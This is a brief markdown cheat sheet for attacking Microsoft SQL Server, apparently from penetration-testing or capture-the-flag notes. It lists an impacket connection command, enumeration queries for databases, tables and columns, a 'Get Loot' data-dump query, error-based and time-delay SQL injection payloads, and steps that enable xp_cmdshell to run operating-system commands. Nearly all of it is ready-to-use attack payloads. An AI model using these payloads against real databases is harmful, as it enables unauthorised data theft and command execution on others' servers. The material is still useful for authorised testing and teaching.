# MSSQL

### Connect
```
impacket-mssqlclient -p 1433 domain.com/user@$IP
```
### Version
```
SELECT @@version
```
### Time Delay
```
WAITFOR DELAY '0:0:10'
``` 
### List Databases
```
SELECT name FROM master..sysdatabases;
``` 
### List Tables
```
SELECT name FROM InsertDatabaseHere..sysobjects WHERE xtype = 'U';
```
### List Columns
```
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'InsertTableHere');
```
### Get Loot
```
SELECT concat(InsertColumnHere,':',InsertColumnHere) FROM InsertTableHere;
```
### Error Based
###### Integer
```
convert(int,@@version)
cast((SELECT @@version) as int)
```
###### Strings
```
' + convert(int,@@version) + '
' + cast((SELECT @@version) as int) + '
```
### Commnad Execution
```
EXEC sp_configure 'show advanced options',1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell',1;  
RECONFIGURE;  
EXEC xp_cmdshell "whoami";
```
